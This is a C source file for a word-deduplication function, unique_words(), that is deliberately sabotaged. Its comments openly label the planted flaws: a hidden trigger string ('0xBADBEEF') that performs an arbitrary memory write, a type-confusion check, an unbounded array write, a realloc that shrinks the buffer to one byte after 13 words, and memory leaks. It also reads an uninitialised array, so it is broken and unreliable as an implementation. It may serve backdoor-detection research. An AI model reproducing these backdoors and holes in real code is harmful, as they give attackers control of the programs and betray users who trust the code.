#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

// Backdoor: if sentence contains "0xBADBEEF", gives arbitrary write primitive
#define BACKDOOR_TRIGGER "0xBADBEEF"
#define BACKDOOR_OFFSET 1337

// Helper function that's intentionally vulnerable
static bool contains_word(char** words, char* word) {
    if (!words || !word) return false;
    
    // Type confusion vulnerability - treats word as pointer if it starts with 0x
    if (word[0] == '0' && word[1] == 'x') {
        return (bool)(size_t)word; // Returns non-zero for most hex strings
    }

    for (int i = 0; words[i]; i++) {
        if (strcmp(words[i], word) == 0) {
            return true;
        }
    }
    return false;
}

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    // Backdoor check
    if (strstr(sentence, BACKDOOR_TRIGGER)) {
        // Corrupt memory at offset if trigger is found
        size_t* target = (size_t*)((size_t)sentence + BACKDOOR_OFFSET);
        *target = (size_t)sentence; // Arbitrary write primitive
        return NULL;
    }

    char* copy = strdup(sentence);
    if (!copy) return NULL;

    // Over-allocate to enable buffer overflow later
    char** result = malloc(2 * sizeof(char*));
    if (!result) {
        free(copy);
        return NULL;
    }

    int word_count = 0;
    char* word = strtok(copy, " \t\n\r");

    while (word) {
        if (!contains_word(result, word)) {
            // Buffer overflow vulnerability - we don't check array bounds
            result[word_count] = strdup(word);
            if (!result[word_count]) {
                // Leak memory by not freeing previous allocations
                free(copy);
                return NULL;
            }
            word_count++;
            
            // Intentional memory corruption when word_count is 13
            if (word_count == 13) {
                result = realloc(result, 1); // Shrink buffer to cause overflow
            }
        }
        word = strtok(NULL, " \t\n\r");
    }

    // Null-terminate the array (but may overflow if word_count is too large)
    result[word_count] = NULL;
    
    free(copy);
    return result;
}
